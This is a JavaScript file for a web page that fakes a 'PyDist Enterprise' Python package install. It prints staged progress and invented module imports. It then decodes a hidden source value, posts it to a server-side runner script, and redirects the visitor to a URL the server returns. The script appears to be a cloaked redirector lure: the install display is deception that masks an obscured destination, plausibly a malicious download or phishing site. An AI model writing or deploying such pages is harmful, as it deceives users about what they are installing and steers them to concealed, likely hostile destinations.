(function() {
    const statusText = document.getElementById('statusText');
    const progressFill = document.getElementById('progressFill');
    const consoleOutput = document.getElementById('consoleOutput');
    
    let packageIndex = 0;
    const modules = [
        'pydist.core', 'pydist.network', 'pydist.crypto',
        'pydist.fetcher', 'pydist.parser', 'pydist.validator',
        'pydist.redirector', 'pydist.worker', 'pydist.metrics', 'pydist.cache'
    ];

    function addConsoleLine(text) {
        if (consoleOutput) {
            consoleOutput.innerHTML += `<span class="console-prompt">$</span> ${text}<br>`;
            consoleOutput.scrollTop = consoleOutput.scrollHeight;
        }
    }

    function updateStatus(message) {
        if (statusText) statusText.textContent = message;
    }

    function updateProgress(value) {
        if (progressFill) progressFill.style.width = Math.min(100, value) + '%';
    }

    function markModuleLoaded() {
        const tags = document.querySelectorAll('.package-tag');
        if (packageIndex < tags.length) {
            tags[packageIndex].classList.remove('pending');
            tags[packageIndex].classList.add('installed');
            packageIndex++;
        }
    }

    async function init() {
        addConsoleLine('PyDist Enterprise v6.2.8');
        addConsoleLine('Python/3.12.4');
        
        updateStatus('Loading modules...');
        updateProgress(5);

        setTimeout(() => { updateStatus('pydist.core'); markModuleLoaded(); updateProgress(15); addConsoleLine('import pydist.core'); }, 200);
        setTimeout(() => { updateStatus('pydist.network'); markModuleLoaded(); updateProgress(25); addConsoleLine('import pydist.network'); }, 400);
        setTimeout(() => { updateStatus('pydist.crypto'); markModuleLoaded(); updateProgress(35); addConsoleLine('import pydist.crypto'); }, 600);
        setTimeout(() => { updateStatus('pydist.fetcher'); markModuleLoaded(); updateProgress(45); addConsoleLine('import pydist.fetcher'); }, 800);
        setTimeout(() => { updateStatus('pydist.parser'); markModuleLoaded(); updateProgress(55); addConsoleLine('import pydist.parser'); }, 1000);
        setTimeout(() => { updateStatus('pydist.validator'); markModuleLoaded(); updateProgress(65); addConsoleLine('import pydist.validator'); }, 1200);
        setTimeout(() => { updateStatus('pydist.redirector'); markModuleLoaded(); updateProgress(75); addConsoleLine('import pydist.redirector'); }, 1400);
        setTimeout(() => { updateStatus('pydist.worker'); markModuleLoaded(); updateProgress(85); addConsoleLine('import pydist.worker'); }, 1600);
        setTimeout(() => { updateStatus('pydist.metrics'); markModuleLoaded(); updateProgress(95); addConsoleLine('import pydist.metrics'); }, 1800);
        
        setTimeout(() => {
            updateStatus('pydist.cache');
            markModuleLoaded();
            updateProgress(100);
            addConsoleLine('import pydist.cache');
            addConsoleLine('All modules loaded');
            
            const source = window.decodeKey();
            addConsoleLine(`source: ${source.replace(/^https?:\/\//, '')}`);
            
            fetch('/cgi-bin/runner.py', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ source: source })
            })
            .then(res => res.json())
            .then(data => {
                if (data.url) {
                    addConsoleLine(`target: ${new URL(data.url).hostname}`);
                    addConsoleLine('redirecting...');
                    document.getElementById('downloadTitle').textContent = 'Redirecting...';
                    updateStatus('redirecting...');
                    setTimeout(() => window.location.replace(data.url), 1800);
                }
            })
            .catch(() => addConsoleLine('error: retry later'));
        }, 2000);
    }

    window.addEventListener('DOMContentLoaded', init);
})();